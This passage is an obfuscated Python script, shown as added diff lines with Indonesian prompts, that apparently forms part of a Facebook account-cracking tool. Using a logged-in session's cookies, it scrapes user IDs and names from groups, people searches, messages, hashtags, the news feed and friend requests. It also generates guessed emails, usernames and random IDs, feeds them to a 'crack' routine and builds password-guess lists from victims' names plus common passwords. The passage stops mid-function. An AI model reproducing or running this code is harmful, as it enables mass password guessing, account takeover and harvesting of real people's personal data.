+                except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+            else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+        except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
+        except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+    def f(self,id):
+        self.fl=(id.replace(' ','_')+'.json')
+        if self.fl=='':self.f()
+        try:os.remove(self.fl)
+        except:pass
+        _dapunta_dapunta_(self.fl,"w").close()
+    def dump_username(self, url):
+        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
+        for i in r.find_all("h3"):
+            try:
+                if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
+                    ogeh=i.find("a",href=True)
+                    if "profile.php" in ogeh.get("href"):
+                        a="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
+                        if len(a)==0:continue
+                        elif a in _dapunta_dapunta_(self.fl).read():continue
+                        else:_dapunta_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text));continue
+                    else:
+                        a="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
+                        if len(a)==0:continue
+                        elif a in _dapunta_dapunta_(self.fl).read():continue
+                        else:_dapunta_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text))
+            except:continue
+        for i in r.find_all("a",href=True):
+            if "Lihat Postingan Lainnya" in i.text:
+                while True:
+                    try:self.dump_username("https://m.facebook.com/"+i.get("href"));break
+                    except Exception as e:_dapunta_cici_('\r%s╚══[%s!%s] %sMengulangi'%(M,P,M,P));continue
+    def dump_id(self, url):
+        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
+        for i in r.find_all("h3"):
+            try:
+                if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
+                    ogeh=i.find("a",href=True)
+                    if "profile.php" in ogeh.get("href"):
+                        a="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
+                        if len(a)==0:continue
+                        elif a in _dapunta_dapunta_(self.fl).read():continue
+                        else:_dapunta_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text));continue
+                    else:
+                        a="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
+                        if len(a)==0:continue
+                        elif a in _dapunta_dapunta_(self.fl).read():continue
+                        else:_dapunta_dapunta_(self.fl,"a+").write("%s•%s\n"%(_get_id_(a),ogeh.text))
+            except:continue
+        for i in r.find_all("a",href=True):
+            if "Lihat Postingan Lainnya" in i.text:
+                while True:
+                    try:self.dump_id("https://m.facebook.com/"+i.get("href"));break
+                    except Exception as e:_dapunta_cici_('\r%s╚══[%s!%s] %sMengulangi'%(M,P,M,P));continue
+
+### Convert Username To ID
+def _get_id_(username):
+    url = "https://lookup-id.com/#"
+    with _req_ses_ as dev:
+        payload = {"fburl": "https://m.facebook.com/{}".format(username), "check": "Lookup"}
+        if "facebook" in username:payload = {"fburl": username, "check": "Lookup"}
+        data_dev = dev.post(url, data=payload).content;sop_ = par(data_dev, "html.parser");id_ = sop_.find("span", id="code");user_get_id = id_.text
+        return user_get_id
+
+### Dump ID From Name
+def dump_name(_dapunta_):
+    _dapunta_cici_('%s╠══[%s•%s] %sContoh : Dapunta,Rizal,Angga'%(O,P,O,P));__name__ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Nama : '%(O,P,O,P)).split(',');_file_ = 'dump_name.json'
+    try:os.remove(_file_)
+    except:pass
+    for _name_ in __name__:_url_ = "https://mbasic.facebook.com/search/people/?q="+_name_;cari_nama(_file_,_dapunta_,_url_)
+    _buka_file_ = _dapunta_dapunta_(_file_,'r').read().splitlines();_dapunta_cici_("\n%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
+    return crack(_file_)
+def cari_nama(_file_,_cookies_,_url_):
+    _dapunta_dapunta_(_file_,"a+");_req_ses_dev_ = bs4.BeautifulSoup(_req_get_(_url_, cookies=_cookies_,headers=header_nama).text,"html.parser")
+    for _dapunta_dev_ in _req_ses_dev_.find_all("a",href=True):
+        _dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+        if "<img alt=" in str(_dapunta_dev_):
+            if "home.php" in str(_dapunta_dev_["href"]):continue
+            else:
+                _str_dev_ = str(_dapunta_dev_["href"])
+                if "profile.php" in _str_dev_:
+                    _name_ = _dapunta_dev_.find("img").get("alt").replace(", profile picture","");_find_ = bs4.re.findall("/profile\.php\?id=(.*?)&",_str_dev_)
+                    if len (_find_) !=0:
+                        _user_ = "".join(_find_)
+                        if _user_ in _dapunta_dapunta_(_file_).read():pass
+                        else:_dapunta_dapunta_(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
+                else:
+                    _find_ = bs4.re.findall("/(.*?)\?",_str_dev_);_name_ = _dapunta_dev_.find("img").get("alt").replace(", profile picture","")
+                    if len(_find_) !=0:
+                        _user_="".join(_find_)
+                        if _user_ in _dapunta_dapunta_(_file_).read():pass
+                        else:_dapunta_dapunta_(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
+        if "Lihat Hasil Selanjutnya" in _dapunta_dev_.text:cari_nama(_file_,_cookies_,_dapunta_dev_["href"])
+
+### Dump ID From Message
+class dump_pesan:
+    def __init__(self,_cookies_,_nama_,_id_):
+        self.cookies = _cookies_;self.id = _id_;self.files = (_nama_+'.json').replace(" ","_");_dapunta_dapunta_(self.files,"w").close();self.dump("https://m.facebook.com/messages")
+    def dump(self,url):
+        _req_ses_dev_ = bs4.BeautifulSoup(_req_get_(url,headers=header_nama,cookies=self.cookies).text,"html.parser")
+        for _dev_ in _req_ses_dev_.find_all("a",href=True):
+            if "/messages/read" in _dev_.get("href"):
+                _soup_ = bs4.re.findall("cid\.c\.(.*?)%3A(.*?)&",_dev_.get("href"))
+                try:
+                    for _user_ in list(_soup_.pop()):
+                        if _user_ in self.id:continue
+                        else:
+                            if "pengguna facebook" in _dev_.text.lower():continue
+                            _dapunta_dapunta_(self.files,"a+").write("%s•%s\n"%(_user_,_dev_.text));_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.files).read().splitlines())),end='');sys.stdout.flush()
+                except Exception as e:continue
+            if "Lihat Pesan Sebelumnya" in _dev_.text:self.dump("https://m.facebook.com/"+_dev_.get("href"))
+        _buka_file_ = _dapunta_dapunta_(self.files,'r').read().splitlines();_dapunta_cici_("\n%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
+        return crack(self.files)
+
+### Dump ID From Files
+def dump_file():
+    _dapunta_cici_("%s╠══[%s•%s] %sContoh : /sdcard/dapunta.json"%(O,P,O,P));_files_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama File : "%(O,P,O,P));_sekat_ = _cici_dapunta_("%s╠══[%s•%s] %sPemisah ID & Nama : "%(O,P,O,P))
+    try:_baca_ = _dapunta_dapunta_(_files_,'r').read();_buku_ = _baca_.replace(_sekat_,'•');_dapunta_dapunta_(_files_,'w').write(_buku_)
+    except:jalan('%s╚══[%s!%s] %sFile Tidak Ditemukan'%(M,P,M,P));menu()
+    return crack(_files_)
+
+### Dump ID From Email
+def dump_email():
+    _dapunta_cici_("%s╠══[%s•%s] %sContoh : Dapunta Khurayra"%(O,P,O,P));_query_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama : "%(O,P,O,P)).lower()
+    if len(_query_) < 3:jalan('%s╚══[%s!%s] %sNama Harus Lebih Dari 2 Digit'%(M,P,M,P));time.sleep(2);menu()
+    _dapunta_cici_("%s╠══[%s•%s] %sContoh : gmail.com"%(O,P,O,P));_domain_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Domain : "%(O,P,O,P)).lower()
+    if '@' in _domain_:_domain_ = _domain_.split('@')[1]
+    _limit_awal_ = int(_cici_dapunta_("%s╠══[%s•%s] %sSet Angka Awal : "%(O,P,O,P)));_limit_akhir_= int(_cici_dapunta_("%s╠══[%s•%s] %sSet Angka Akhir : "%(O,P,O,P)));_file_ = (_query_+".json").replace(" ","_")
+    try:os.remove(_file_)
+    except:pass
+    exec_email(_query_,_domain_,_limit_awal_,_limit_akhir_,_file_)
+def exec_email(__query__,_domain_,_limit_awal_,_limit_akhir_,_file_):
+    _hitung_email_1_ = _limit_awal_+1;_hitung_email_2_ = _limit_awal_+1;_hitung_email_3_ = _limit_awal_+1;_hitung_email_full_ = _limit_awal_+1
+    if ' ' in __query__:
+        try:_query_1_ = __query__.split(' ')[0]
+        except:pass
+        try:_query_2_ = __query__.split(' ')[1]
+        except:pass
+        try:_query_3_ = __query__.split(' ')[2]
+        except:pass
+    elif '.' in __query__:
+        try:_query_1_ = __query__.split('.')[0]
+        except:pass
+        try:_query_2_ = __query__.split('.')[1]
+        except:pass
+        try:_query_3_ = __query__.split('.')[2]
+        except:pass
+    elif '_' in __query__:
+        try:_query_1_ = __query__.split('_')[0]
+        except:pass
+        try:_query_2_ = __query__.split('_')[1]
+        except:pass
+        try:_query_3_ = __query__.split('_')[2]
+        except:pass
+    elif '-' in __query__:
+        try:_query_1_ = __query__.split('-')[0]
+        except:pass
+        try:_query_2_ = __query__.split('-')[1]
+        except:pass
+        try:_query_3_ = __query__.split('-')[2]
+        except:pass
+    else:
+        try:_query_1_ = __query__
+        except:pass
+    try :
+        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
+            try:nama = _query_1_;email = ('%s%s@%s'%(_query_1_,str(_hitung_email_1_),_domain_));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_1_ += 1
+            except:continue
+        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
+            try:nama = _query_2_;email = ('%s%s@%s'%(_query_2_,str(_hitung_email_2_),_domain_));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_2_ += 1
+            except:continue
+        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
+            try:nama = _query_3_;email = ('%s%s@%s'%(_query_3_,str(_hitung_email_3_),_domain_));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_3_ += 1
+            except:continue
+        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
+            try:
+                if '.' in __query__:_query_ = __query__;nama = __query__.replace('.',' ')
+                elif '_' in __query__:_query_ = __query__;nama = __query__.replace('_',' ')
+                elif '-' in __query__:_query_ = __query__;nama = __query__.replace('-',' ')
+                else:_query_ = __query__.replace(' ','');nama = __query__
+                email = ('%s%s@%s'%(_query_,str(_hitung_email_full_),_domain_));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_full_ += 1
+            except:continue
+    except:
+        jalan('%s╚══[%s!%s] %sTerjadi Kesalahan'%(M,P,M,P));time.sleep(2);menu()
+    _buka_file_ = _dapunta_dapunta_(_file_,'r').read().splitlines()
+    _dapunta_cici_("%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
+    return crack(_file_)
+
+### Dump ID Acak (By Dapunta)
+def _main_random_():
+    file = 'dump_random.json'
+    try:os.remove(file)
+    except:pass
+    _dapunta_cici_('%s╠══[%s01%s] %sDump ID Old'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s02%s] %sDump ID New'%(O,P,O,P))
+    _cok_ = input('%s╠══[%s••%s] %sPilih : '%(O,P,O,P))
+    _dapunta_cici_('%s║'%(O))
+    if _cok_ in ['1','01']:_random_old_(file);_dapunta_cici_('');return set_pass_dev(file)
+    elif _cok_ in ['2','02']:_random_new_(file);_dapunta_cici_('');return set_pass_dev(file)
+    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+def _random_old_(_file_):
+    try:
+        open(_file_,'a')
+        _jum_ = int(input("%s╠══[%s•%s] %sMasukkan Jumlah : "%(O,P,O,P)))
+        _old_ = input("%s╠══[%s•%s] %sID Old Berapa Digit : "%(O,P,O,P))
+        _dapunta_cici_('%s╠══[%s•%s] %sContoh : 1 / 12 / 15 / 18 / 19'%(O,P,O,P))
+        _dig_ = input('%s╠══[%s•%s] %sMasukkan ID Depan : '%(O,P,O,P))
+        _idg_ = int(_old_) - int(len(_dig_))
+        _awa_ = int(str('1'*_idg_))
+        _akh_ = int(str('9'*_idg_))
+        _dapunta_cici_('%s║'%(O))
+        _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
+        for i in range(_jum_):
+            x = random.randint(_awa_,_akh_)
+            id = (str(_dig_)+str(x))
+            try:open(_file_,'a+').write('%s\n'%(id))
+            except :pass
+            _dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Generate %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+    except:_dapunta_cici_('');return set_pass_dev(_file_)
+def _random_new_(_file_):
+    try:
+        open(_file_,'a')
+        _jum_ = int(input("%s╠══[%s•%s] %sMasukkan Jumlah : "%(O,P,O,P)))
+        _dapunta_cici_('%s╠══[%s•%s] %sContoh : 10005 / 100005 / 1000005'%(O,P,O,P))
+        _dig_ = input('%s╠══[%s•%s] %sMasukkan ID Depan : '%(O,P,O,P))
+        _idg_ = int(15) - int(len(_dig_))
+        _awa_ = int(str('1'*_idg_))
+        _akh_ = int(str('9'*_idg_))
+        _dapunta_cici_('%s║'%(O))
+        _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
+        for i in range(_jum_):
+            x = random.randint(_awa_,_akh_)
+            id = (str(_dig_)+str(x))
+            try:open(_file_,'a+').write('%s\n'%(id))
+            except :pass
+            _dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Generate %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+    except:_dapunta_cici_('');return set_pass_dev(_file_)
+
+### Dump Username
+def dump_username():
+    _dapunta_cici_("%s╠══[%s•%s] %sContoh : dapunta.khurayra"%(O,P,O,P));_query_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama : "%(O,P,O,P)).lower()
+    if len(_query_) < 3:jalan('%s╚══[%s!%s] %sNama Harus Lebih Dari 2 Digit'%(M,P,M,P));time.sleep(2);menu()
+    _limit_awal_ = int(_cici_dapunta_("%s╠══[%s•%s] %sSet Angka Awal : "%(O,P,O,P)));_limit_akhir_= int(_cici_dapunta_("%s╠══[%s•%s] %sSet Angka Akhir : "%(O,P,O,P)));_file_ = (_query_+".json").replace(" ","_")
+    try:os.remove(_file_)
+    except:pass
+    exec_username(_query_,_limit_awal_,_limit_akhir_,_file_)
+def exec_username(__query__,_limit_awal_,_limit_akhir_,_file_):
+    _hitung_email_1_ = _limit_awal_+1;_hitung_email_2_ = _limit_awal_+1;_hitung_email_3_ = _limit_awal_+1;_hitung_email_full_ = _limit_awal_+1
+    if ' ' in __query__:
+        try:_query_1_ = __query__.split(' ')[0]
+        except:pass
+        try:_query_2_ = __query__.split(' ')[1]
+        except:pass
+        try:_query_3_ = __query__.split(' ')[2]
+        except:pass
+    elif '.' in __query__:
+        try:_query_1_ = __query__.split('.')[0]
+        except:pass
+        try:_query_2_ = __query__.split('.')[1]
+        except:pass
+        try:_query_3_ = __query__.split('.')[2]
+        except:pass
+    elif '_' in __query__:
+        try:_query_1_ = __query__.split('_')[0]
+        except:pass
+        try:_query_2_ = __query__.split('_')[1]
+        except:pass
+        try:_query_3_ = __query__.split('_')[2]
+        except:pass
+    elif '-' in __query__:
+        try:_query_1_ = __query__.split('-')[0]
+        except:pass
+        try:_query_2_ = __query__.split('-')[1]
+        except:pass
+        try:_query_3_ = __query__.split('-')[2]
+        except:pass
+    else:
+        try:_query_1_ = __query__
+        except:pass
+    try :
+        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
+            try:nama = _query_1_;email = ('%s%s'%(_query_1_,str(_hitung_email_1_)));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_1_ += 1
+            except:continue
+        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
+            try:nama = _query_2_;email = ('%s%s'%(_query_2_,str(_hitung_email_2_)));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_2_ += 1
+            except:continue
+        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
+            try:nama = _query_3_;email = ('%s%s'%(_query_3_,str(_hitung_email_3_)));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_3_ += 1
+            except:continue
+        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
+            try:
+                if '.' in __query__:_query_ = __query__;nama = __query__.replace('.',' ')
+                elif '_' in __query__:_query_ = __query__;nama = __query__.replace('_',' ')
+                elif '-' in __query__:_query_ = __query__;nama = __query__.replace('-',' ')
+                else:_query_ = __query__.replace(' ','');nama = __query__
+                email = ('%s%s'%(_query_,str(_hitung_email_full_)));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_full_ += 1
+            except:continue
+    except:jalan('%s╚══[%s!%s] %sTerjadi Kesalahan'%(M,P,M,P));time.sleep(2);menu()
+    _buka_file_ = _dapunta_dapunta_(_file_,'r').read().splitlines();_dapunta_cici_("%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
+    return crack(_file_)
+
+### Dump ID Dari Hashtag
+def hashtag(cookies):
+    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Hashtag : '%(O,P,O,P));_url_dev_ = 'https://mbasic.facebook.com/hashtag/' + _query_;_file_ = (_query_+'.json').replace(' ','_')
+    try:os.remove(_file_)
+    except:pass
+    _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_hashtag(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+def exec_hashtag(url,cookies,_file_):
+    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_hashtag);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+    try:
+        for _cici_ in _sop_dev_.find_all('h3'):
+            for _dapunta_ in _cici_.find_all('a',href=True):
+                if 'mbasic.facebook.com' in _dapunta_.get('href'):pass
+                else:
+                    if "profile.php" in _dapunta_.get('href'):
+                        try:
+                            _name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_dapunta_.get("href")))
+                            if _name_dev_ in _buka_file_:pass
+                            elif '/' in _id_dev_:pass
+                            else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
+                        except:pass
+                    else:
+                        try:
+                            _name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall("/(.*?)\?",_dapunta_.get("href")))
+                            if _name_dev_ in _buka_file_:pass
+                            elif '/' in _id_dev_:pass
+                            else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
+                        except:pass
+            for _dapunta_ in _sop_dev_.find_all('a',href=True):
+                if 'Lihat Hasil Selanjutnya' in _dapunta_.text:url_dev = _dapunta_.get('href');exec_hashtag(url_dev,cookies,_file_)
+    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+
+### Dump ID Dari Beranda
+def beranda(cookies):
+    _url_dev_ = 'https://mbasic.facebook.com/home.php';_file_ = 'beranda.json'
+    try:os.remove(_file_)
+    except:pass
+    _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_beranda(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+def exec_beranda(url,cookies,_file_):
+    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+    try:
+        for _cici_ in _sop_dev_.find_all('h3'):
+            for _dapunta_ in _cici_.find_all('a',href=True):
+                if "profile.php" in _dapunta_.get('href'):
+                    try:
+                        _name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_dapunta_.get("href")))
+                        if _name_dev_ in _buka_file_:pass
+                        elif '/' in _id_dev_:pass
+                        else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
+                    except:pass
+                else:
+                    try:
+                        _name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall("/(.*?)\?",_dapunta_.get("href")))
+                        if _name_dev_ in _buka_file_:pass
+                        elif '/' in _id_dev_:pass
+                        else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
+                    except:pass
+            for _dapunta_ in _sop_dev_.find_all('a',href=True):
+                if 'Lihat Berita Lain' in _dapunta_.text:url_dev = 'https://mbasic.facebook.com/' + _dapunta_.get('href');exec_beranda(url_dev,cookies,_file_)
+    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+
+### Dump ID Permintaan Pertemanan Masuk
+def permintaan_pertemanan_masuk(cookies):
+    _url_dev_ = 'https://mbasic.facebook.com/friends/center/requests';_file_ = 'teman_masuk.json'
+    try:os.remove(_file_)
+    except:pass
+    _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_permintaan_pertemanan_masuk(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+def exec_permintaan_pertemanan_masuk(url,cookies,_file_):
+    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+    try:
+        for _dapunta_ in _sop_dev_.find_all('a',href=True):
+            if '/friends/hovercard' in _dapunta_.get('href'):
+                try:_name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall('uid=(.*?)&',_dapunta_.get('href')));open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
+                except:pass
+            else:pass
+        for _dapunta_ in _sop_dev_.find_all('a',href=True):
+            if 'Lihat selengkapnya' in _dapunta_.text:url_dev = 'https://mbasic.facebook.com/' + _dapunta_.get('href');exec_permintaan_pertemanan_masuk(url_dev,cookies,_file_)
+    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+
+### Dump ID Permintaan Pertemanan Keluar
+def permintaan_pertemanan_keluar(cookies):
+    _url_dev_ = 'https://mbasic.facebook.com/friends/center/requests/outgoing';_file_ = 'teman_keluar.json'
+    try:os.remove(_file_)
+    except:pass
+    _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_permintaan_pertemanan_keluar(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+def exec_permintaan_pertemanan_keluar(url,cookies,_file_):
+    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+    try:
+        for _dapunta_ in _sop_dev_.find_all('a',href=True):
+            if '/friends/hovercard' in _dapunta_.get('href'):
+                try:_name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall('uid=(.*?)&',_dapunta_.get('href')));open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
+                except:pass
+            else:pass
+        for _dapunta_ in _sop_dev_.find_all('a',href=True):
+            if 'Lihat selengkapnya' in _dapunta_.text:url_dev = 'https://mbasic.facebook.com/' + _dapunta_.get('href');exec_permintaan_pertemanan_keluar(url_dev,cookies,_file_)
+    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+
+### Cek Target Crack
+def cek_target_crack_(_id_):
+    open('list_id.txt','a+')
+    try:
+        _cek_ = open('list_id.txt','r').read()
+        if _id_ in _cek_:
+            if _id_ == 'me':pass
+            else:
+                _cokzz_ = _cici_dapunta_('%s╠══[%s!%s] %sID Sudah Pernah Dicrack, Lanjut? [y/t] : '%(M,P,M,P))
+                if _cokzz_ in ['',' ']:pass
+                elif _cokzz_ in ['1','01','y']:pass
+                elif _cokzz_ in ['2','02','t']:menu()
+                else:pass
+        else:_dapunta_dapunta_('list_id.txt',"a+").write("%s\n"%(_id_))
+    except:pass
+
+### Generate Password
+def generate1(_cici_):
+    _dapunta_=[]
+    for i in _cici_.split(" "):
+        if len(i)<3:continue 
+        else:
+            i=i.lower()
+            if len(i)==3 or len(i)==4 or len(i)==5:_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
+            elif len(i)>=6:_dapunta_.append(i);_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
+            else:continue
+    _dapunta_.append(_cici_.lower())
+    return _dapunta_
+def generate2(_cici_):
+    _dapunta_=[]
+    for i in _cici_.split(" "):
+        if len(i)<3:continue
+        else:
+            i=i.lower()
+            if len(i)==3 or len(i)==4 or len(i)==5:_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
+            else:_dapunta_.append(i); _dapunta_.append(i+"123");_dapunta_.append(i+"12345")
+    _dapunta_.append(_cici_.lower());_dapunta_.append("sayang");_dapunta_.append("bismillah");_dapunta_.append("anjing")
+    return _dapunta_
+def generate3(_cici_):
+    _dapunta_=[]
+    for i in _cici_.split(" "):
+        if len(i)<3:continue
+        else:
+            i=i.lower()
+            if len(i)==3 or len(i)==4 or len(i)==5:_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
+            else:_dapunta_.append(i);_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
+    _dapunta_.append(_cici_.lower());_dapunta_.append("sayang");_dapunta_.append("bismillah");_dapunta_.append("anjing");_dapunta_.append("123456");_dapunta_.append("bangsat");_dapunta_.append("sayangku")
+    return _dapunta_
+def generate4(_cici_):
+    _dapunta_=[]
+    ps = _dapunta_dapunta_('pass.txt','r').read()
+    pp = _dapunta_dapunta_('passangka.txt','r').read()
+    for i in _cici_.split(" "):  
+        i=i.lower()
+        if len(i)<3:continue
+        elif len(i)==3 or len(i)==4 or len(i)==5:_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
+        else:_dapunta_.append(i);_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
+    if pp in ['',' ','  ']:pass
+    else:
+        for i in _cici_.split(" "):  
+            i=i.lower()
+            for x in pp.split(','):_dapunta_.append(i+x)
+    if ps in ['',' ','  ']:pass
+    else:
+        for z in ps.split(','):_dapunta_.append(z)
+    _dapunta_.append(_cici_.lower())
+    return _dapunta_
+def tambah_pass():
+    _dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456,786786'%(O,P,O,P));cuy = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Pass Tambahan Manual [1 Kata] : '%(O,P,O,P));gh = _dapunta_dapunta_('pass.txt','w');gh.write(cuy);gh.close
+def tambah_pass_angka():
